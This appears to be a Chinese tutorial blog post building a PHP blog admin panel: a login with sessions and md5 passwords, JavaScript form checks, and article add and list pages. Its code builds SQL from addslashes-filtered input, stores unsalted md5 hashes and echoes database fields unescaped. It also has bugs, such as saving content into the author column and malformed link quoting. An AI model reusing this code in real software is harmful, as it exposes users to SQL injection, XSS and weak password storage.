class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$value</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="session用户登陆验证和前台js验证"><a href="#session用户登陆验证和前台js验证" class="headerlink" title="session用户登陆验证和前台js验证"></a>session用户登陆验证和前台js验证</h2><p>session用户登录验证</p><p>部分login.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span> <span class="token string single-quoted-string">'init.php'</span><span class="token punctuation">;</span><span class="token comment">//点击登录按钮后 后端验证</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sub'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$username</span><span class="token operator">=</span><span class="token function">filterstr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$password</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">filterstr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from users where username='<span class="token interpolation"><span class="token variable">$username</span></span>'and password='<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token property">num_rows</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$row</span><span class="token operator">=</span><span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//数组匹配</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location: main.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//跳转到main.php页面</span>            <span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script&gt;alert('用户或密码错误')&lt;/script&gt;"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span>  <span class="token string double-quoted-string">"&lt;script&gt;alert('用户或密码错误')&lt;/script&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前台js验证</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token comment">//点击登录按钮前端js验证</span>    <span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token parameter">form</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">var</span> username<span class="token operator">=</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>value<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>username<span class="token punctuation">.</span>length<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'用户名不能为空'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            form<span class="token punctuation">.</span>username<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">var</span> password<span class="token operator">=</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>value<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>password<span class="token punctuation">.</span>length<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'密码不能为空'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            form<span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="login-php登录效果"><a href="#login-php登录效果" class="headerlink" title="login.php登录效果"></a>login.php登录效果</h2><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude_once 'init.php';//点击登录按钮后 后端验证if($_POST['sub']){    $username=filterstr($_POST['username']);    $password=md5(filterstr($_POST['password']));    $result=$conn-&gt;query("select * from users where username='$username'and password='$password'");    if($result-&gt;num_rows&gt;0){        $row=$result-&gt;fetch_assoc();//数组匹配        if($row['password']==$password){            $_SESSION['username']= $row['username'];            header('location: main.php');//跳转到main.php页面            $conn-&gt;close();        }else{            echo "&lt;script&gt;alert('用户或密码错误')&lt;/script&gt;";        }    }else{        echo  "&lt;script&gt;alert('用户或密码错误')&lt;/script&gt;";    }}?&gt;&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset="UTF-8"/&gt;    &lt;title&gt;『晓莎K』后台管理&lt;/title&gt;    &lt;link rel="stylesheet" type="text/css" href="css/admin_login.css"/&gt;    &lt;script&gt;        //点击登录按钮前端js验证        function check(form){            var username=form.username.value;            if(username.length==0){                alert('用户名不能为空');                form.username.focus();                return false;            }            var password=form.password.value;            if(password.length==0){                alert('密码不能为空');                form.password.focus();                return false;            }            return true;        }    &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="admin_login_wrap"&gt;    &lt;h1&gt;后台管理&lt;/h1&gt;    &lt;div class="adming_login_border"&gt;        &lt;div class="admin_input"&gt;            &lt;form action="" method="post" onsubmit="return check(this)"&gt;                &lt;ul class="admin_items"&gt;                    &lt;li&gt;                        &lt;label for="username"&gt;用户名：&lt;/label&gt;                        &lt;input type="text" name="username"  id="username" size="40" class="admin_input_style" /&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;label for="password"&gt;密码：&lt;/label&gt;                        &lt;input type="password" name="password"  id="password" size="40" class="admin_input_style" /&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;input type="submit" tabindex="3" value="提交" name="sub" class="btn btn-primary" /&gt;                    &lt;/li&gt;                &lt;/ul&gt;            &lt;/form&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/13/60-zhi-day9/image-20210713170046452.png" alt="image-20210713170046452"></p><p><img src="/2021/07/13/60-zhi-day9/image-20210713170054249.png" alt="image-20210713170054249"></p><p><img src="/2021/07/13/60-zhi-day9/image-20210713170103544.png" alt="image-20210713170103544"></p><p><img src="/2021/07/13/60-zhi-day9/image-20210713170110674.png" alt="image-20210713170110674"></p><p>登陆成功后跳转到main.php//暂时效果</p><p><img src="/2021/07/13/60-zhi-day9/image-20210713170143826.png" alt="image-20210713170143826"></p><h2 id="套用模板主题-修改登录和后台样式"><a href="#套用模板主题-修改登录和后台样式" class="headerlink" title="套用模板主题  修改登录和后台样式"></a>套用模板主题  修改登录和后台样式</h2><p>我们套用模板让我们的项目美化</p><p><img src="/2021/07/13/60-zhi-day9/image-20210713170722167.png" alt="image-20210713170722167"></p><p>将之放入admin</p><p><img src="/2021/07/13/60-zhi-day9/image-20210713170527925.png" alt="image-20210713170527925"></p><p>效果如下：</p><p><img src="/2021/07/13/60-zhi-day9/image-20210713170750859.png" alt="image-20210713170750859"></p><p><img src="/2021/07/13/60-zhi-day9/image-20210713170807689.png" alt="image-20210713170807689"></p><h2 id="文章模块内容增加编写"><a href="#文章模块内容增加编写" class="headerlink" title="文章模块内容增加编写"></a>文章模块内容增加编写</h2><p>我们将提交sub的数据放入变量，通过sql语句插入</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude_once 'init.php';$cate_result = $conn-&gt;query("select * from cate");if($_POST['sub']){    $title = filterstr($_POST['title']);    $content = filterstr($_POST['content']);    $author = filterstr($_POST['author']);    $keyword = filterstr($_POST['keyword']);    $c_time = time();    $conn-&gt;query("insert into article(title,content,author,keyword,c_time) values ('$title','$content','$content','$keyword','$c_time') ");    if($conn-&gt;affected_rows){//affected_rows() 函数返回前一次 MySQL 操作所影响的记录行数。        echo "成功添加内容";    }else{        echo "添加内容失败";    }}?&gt;&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset="UTF-8"/&gt;    &lt;title&gt;后台管理&lt;/title&gt;    &lt;link rel="stylesheet" type="text/css" href="css/common.css"/&gt;    &lt;link rel="stylesheet" type="text/css" href="css/main.css"/&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="topbar-wrap white"&gt;    &lt;div class="topbar-inner clearfix"&gt;        &lt;div class="topbar-logo-wrap clearfix"&gt;            &lt;h1 class="topbar-logo none"&gt;&lt;a href="index.html" class="navbar-brand"&gt;后台管理&lt;/a&gt;&lt;/h1&gt;            &lt;ul class="navbar-list clearfix"&gt;                &lt;li&gt;&lt;a class="on" href="index.html"&gt;首页&lt;/a&gt;&lt;/li&gt;                &lt;li&gt;&lt;a href="#" target="_blank"&gt;网站首页&lt;/a&gt;&lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;        &lt;div class="top-info-wrap"&gt;            &lt;ul class="top-info-list clearfix"&gt;                &lt;li&gt;&lt;a href="#"&gt;管理员&lt;/a&gt;&lt;/li&gt;                &lt;li&gt;&lt;a href="#"&gt;修改密码&lt;/a&gt;&lt;/li&gt;                &lt;li&gt;&lt;a href="#"&gt;退出&lt;/a&gt;&lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;div class="container clearfix"&gt;    &lt;div class="sidebar-wrap"&gt;        &lt;div class="sidebar-title"&gt;            &lt;h1&gt;菜单&lt;/h1&gt;        &lt;/div&gt;        &lt;div class="sidebar-content"&gt;            &lt;ul class="sidebar-list"&gt;                &lt;li&gt;                    &lt;a href="#"&gt;&lt;i class="icon-font"&gt;&amp;#xe003;&lt;/i&gt;常用操作&lt;/a&gt;                    &lt;ul class="sub-menu"&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe008;&lt;/i&gt;作品管理&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe005;&lt;/i&gt;博文管理&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe006;&lt;/i&gt;分类管理&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe004;&lt;/i&gt;留言管理&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe012;&lt;/i&gt;评论管理&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe052;&lt;/i&gt;友情链接&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe033;&lt;/i&gt;广告管理&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/li&gt;                &lt;li&gt;                    &lt;a href="#"&gt;&lt;i class="icon-font"&gt;&amp;#xe018;&lt;/i&gt;系统管理&lt;/a&gt;                    &lt;ul class="sub-menu"&gt;                        &lt;li&gt;&lt;a href="system.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe017;&lt;/i&gt;系统设置&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="system.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe037;&lt;/i&gt;清理缓存&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="system.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe046;&lt;/i&gt;数据备份&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="system.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe045;&lt;/i&gt;数据还原&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;!--/sidebar--&gt;    &lt;div class="main-wrap"&gt;        &lt;div class="crumb-wrap"&gt;            &lt;div class="crumb-list"&gt;&lt;i class="icon-font"&gt;&lt;/i&gt;&lt;a href="/jscss/admin/design/"&gt;首页&lt;/a&gt;&lt;span class="crumb-step"&gt;&gt;&lt;/span&gt;&lt;a class="crumb-name" href="/jscss/admin/design/"&gt;作品管理&lt;/a&gt;&lt;span class="crumb-step"&gt;&gt;&lt;/span&gt;&lt;span&gt;新增作品&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;div class="result-wrap"&gt;            &lt;div class="result-content"&gt;                &lt;form action="" method="post" id="myform" name="myform" enctype="multipart/form-data"&gt;                    &lt;table class="insert-tab" width="100%"&gt;                        &lt;tbody&gt;&lt;tr&gt;                            &lt;th width="120"&gt;&lt;i class="require-red"&gt;*&lt;/i&gt;分类：&lt;/th&gt;                            &lt;td&gt;                                &lt;select name="colId" id="catid" class="required"&gt;                                    &lt;option value=""&gt;请选择&lt;/option&gt;                                    &lt;option value="19"&gt;精品界面&lt;/option&gt;&lt;option value="20"&gt;推荐界面&lt;/option&gt;                                &lt;/select&gt;                            &lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th&gt;&lt;i class="require-red"&gt;*&lt;/i&gt;标题：&lt;/th&gt;                            &lt;td&gt;                                &lt;input class="common-text required" id="title" name="title" size="50" value="" type="text"&gt;                            &lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th&gt;作者：&lt;/th&gt;                            &lt;td&gt;&lt;input class="common-text" name="author" size="50" value="admin" type="text" &gt;&lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th&gt;关键字：&lt;/th&gt;                            &lt;td&gt;&lt;input class="common-text" name="keyword" size="50"  type="text"placeholder="请输入关键词以空格或逗号隔开"&gt;&lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th&gt;内容：&lt;/th&gt;                            &lt;td&gt;&lt;textarea name="content" id="EditorId" class="common-textarea" id="content" cols="30" style="width: 98%;" rows="10"&gt;&lt;/textarea&gt;&lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th&gt;&lt;/th&gt;                            &lt;td&gt;                                &lt;input class="btn btn-primary btn6 mr10" value="提交"  name="sub" type="submit"&gt;                                &lt;input class="btn btn6" onClick="history.go(-1)" value="返回" type="button"&gt;                            &lt;/td&gt;                        &lt;/tr&gt;                        &lt;/tbody&gt;&lt;/table&gt;                &lt;/form&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;!--/main--&gt;&lt;/div&gt;&lt;script type="text/javascript" src="ueditor/ueditor.config.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="ueditor/ueditor.all.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="ueditor/lang/zh-cn/zh-cn.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" charset="utf-8"&gt;//初始化编辑器    window.UEDITOR_HOME_URL = "ueditor/";//配置路径设定为UEditor所放的位置    window.onload=function(){        /* window.UEDITOR_CONFIG.initialFrameHeight=600;//编辑器的高度*/        /* window.UEDITOR_CONFIG.initialFrameWidth=1200;//编辑器的宽度*/        var editor = new UE.ui.Editor({            imageUrl : '',            fileUrl : '',            imagePath : '',            filePath : '',            imageManagerUrl:'', //图片在线管理的处理地址            imageManagerPath:''        });        editor.render("EditorId");//此处的EditorId与&lt;textarea name="content" id="EditorId"&gt;的id值对应 &lt;/textarea&gt;    }&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="文章模块栏目分类的编写"><a href="#文章模块栏目分类的编写" class="headerlink" title="文章模块栏目分类的编写"></a>文章模块栏目分类的编写</h2><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;th width="120"&gt;&lt;i class="require-red"&gt;*&lt;/i&gt;分类：&lt;/th&gt;&lt;td&gt;    &lt;select name="cateid" id="cateid" class="required"&gt;        &lt;option value=""&gt;请选择&lt;/option&gt;        &lt;?php        $cate_result=$conn-&gt;query("select * from cate");        while($row= $cate_result-&gt;fetch_assoc()){            ?&gt;            &lt;option value="&lt;?php echo $row['id'];?&gt;"&gt;&lt;?php echo $row['class_name'];?&gt;&lt;/option&gt;            &lt;?php        }        ?&gt;    &lt;/select&gt;&lt;/td&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/13/60-zhi-day9/image-20210713202452249.png" alt="image-20210713202452249"></p><p>还有一些细节改动就先不写了</p><h2 id="文章模块列表功能编写"><a href="#文章模块列表功能编写" class="headerlink" title="文章模块列表功能编写"></a>文章模块列表功能编写</h2><p>article_list.php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude_once 'init.php';?&gt;&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset="UTF-8"/&gt;    &lt;title&gt;后台管理&lt;/title&gt;    &lt;link rel="stylesheet" type="text/css" href="css/common.css"/&gt;    &lt;link rel="stylesheet" type="text/css" href="css/main.css"/&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="topbar-wrap white"&gt;    &lt;div class="topbar-inner clearfix"&gt;        &lt;div class="topbar-logo-wrap clearfix"&gt;            &lt;h1 class="topbar-logo none"&gt;&lt;a href="index.html" class="navbar-brand"&gt;后台管理&lt;/a&gt;&lt;/h1&gt;            &lt;ul class="navbar-list clearfix"&gt;                &lt;li&gt;&lt;a class="on" href="index.html"&gt;首页&lt;/a&gt;&lt;/li&gt;                &lt;li&gt;&lt;a href="#" target="_blank"&gt;网站首页&lt;/a&gt;&lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;        &lt;div class="top-info-wrap"&gt;            &lt;ul class="top-info-list clearfix"&gt;                &lt;li&gt;&lt;a href="#"&gt;管理员&lt;/a&gt;&lt;/li&gt;                &lt;li&gt;&lt;a href="#"&gt;修改密码&lt;/a&gt;&lt;/li&gt;                &lt;li&gt;&lt;a href="#"&gt;退出&lt;/a&gt;&lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;div class="container clearfix"&gt;    &lt;div class="sidebar-wrap"&gt;        &lt;div class="sidebar-title"&gt;            &lt;h1&gt;菜单&lt;/h1&gt;        &lt;/div&gt;        &lt;div class="sidebar-content"&gt;            &lt;ul class="sidebar-list"&gt;                &lt;li&gt;                    &lt;a href="#"&gt;&lt;i class="icon-font"&gt;&amp;#xe003;&lt;/i&gt;常用操作&lt;/a&gt;                    &lt;ul class="sub-menu"&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe008;&lt;/i&gt;作品管理&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe005;&lt;/i&gt;博文管理&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe006;&lt;/i&gt;分类管理&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe004;&lt;/i&gt;留言管理&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe012;&lt;/i&gt;评论管理&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe052;&lt;/i&gt;友情链接&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="design.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe033;&lt;/i&gt;广告管理&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/li&gt;                &lt;li&gt;                    &lt;a href="#"&gt;&lt;i class="icon-font"&gt;&amp;#xe018;&lt;/i&gt;系统管理&lt;/a&gt;                    &lt;ul class="sub-menu"&gt;                        &lt;li&gt;&lt;a href="system.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe017;&lt;/i&gt;系统设置&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="system.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe037;&lt;/i&gt;清理缓存&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="system.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe046;&lt;/i&gt;数据备份&lt;/a&gt;&lt;/li&gt;                        &lt;li&gt;&lt;a href="system.html"&gt;&lt;i class="icon-font"&gt;&amp;#xe045;&lt;/i&gt;数据还原&lt;/a&gt;&lt;/li&gt;                    &lt;/ul&gt;                &lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;!--/sidebar--&gt;    &lt;div class="main-wrap"&gt;        &lt;div class="crumb-wrap"&gt;            &lt;div class="crumb-list"&gt;&lt;i class="icon-font"&gt;&lt;/i&gt;&lt;a href="index.html"&gt;首页&lt;/a&gt;&lt;span class="crumb-step"&gt;&gt;&lt;/span&gt;&lt;span class="crumb-name"&gt;作品管理&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;div class="result-wrap"&gt;            &lt;form name="myform" id="myform" method="post"&gt;                &lt;div class="result-title"&gt;                    &lt;div class="result-list"&gt;                        &lt;a href="article_add.php"&gt;&lt;i class="icon-font"&gt;&lt;/i&gt;新增作品&lt;/a&gt;                    &lt;/div&gt;                &lt;/div&gt;                &lt;div class="result-content"&gt;                    &lt;table class="result-tab" width="100%"&gt;                        &lt;tr&gt;                            &lt;th&gt;ID&lt;/th&gt;                            &lt;th&gt;标题&lt;/th&gt;                            &lt;th&gt;点击&lt;/th&gt;                            &lt;th&gt;发布人&lt;/th&gt;                            &lt;th&gt;更新时间&lt;/th&gt;                            &lt;th&gt;操作&lt;/th&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                        &lt;?php                        $result = $conn-&gt;query("select * from article");                        while ($row=$result-&gt;fetch_assoc()){                        ?&gt;                            &lt;td&gt;&lt;?php echo $row['id']?&gt;&lt;/td&gt;                            &lt;td title="&lt;?php echo $row['title']?&gt;"&gt;&lt;a target="_blank" href="article_edit.php?id="&lt;?php echo $row['id']?&gt;" title="&lt;?php echo $row['title']?&gt;"&gt;&lt;?php echo $row['title']?&gt;&lt;/a&gt;                            &lt;/td&gt;                            &lt;td&gt;&lt;?php echo $row['n']?&gt;&lt;/td&gt;                            &lt;td&gt;&lt;?php echo $row['author']?&gt;&lt;/td&gt;                            &lt;td&gt;&lt;?php echo date("Y-m-d H:i:s",$row['c_time'])?&gt;&lt;/td&gt;                            &lt;td&gt;                                &lt;a class="link-update" href="article_edit.php?id="&lt;?php echo $row['id']?&gt;&gt;修改&lt;/a&gt;                                &lt;a class="link-del" href="#"&gt;删除&lt;/a&gt;                            &lt;/td&gt;                        &lt;/tr&gt;                        &lt;?php                        }                        ?&gt;                    &lt;/table&gt;                    &lt;div class="list-page"&gt; 1 条 1/1 页&lt;/div&gt;                &lt;/div&gt;            &lt;/form&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;!--/main--&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/13/60-zhi-day9/image-20210713202759061.png" 